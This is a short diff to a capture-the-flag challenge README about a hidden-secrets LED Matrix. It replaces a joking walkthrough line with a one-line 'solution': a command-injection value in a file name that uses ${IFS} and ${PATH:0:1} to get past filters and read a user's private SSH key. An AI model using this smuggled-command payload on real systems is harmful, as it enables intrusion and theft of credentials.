@@ -20,4 +20,5 @@ There has been rumors that the LED Matrix hides some secrets, can you find thenm
 - Flag 4: Did you do your local enumeration?
 
 ## Walkthrough
-- LOL you think youll get the answers super easy ?
+#"pixel_art.json;cat${IFS}${PATH:0:1}home${PATH:0:1}elfie${PATH:0:1}.ssh${PATH:0:1}id_rsa" solution 
+
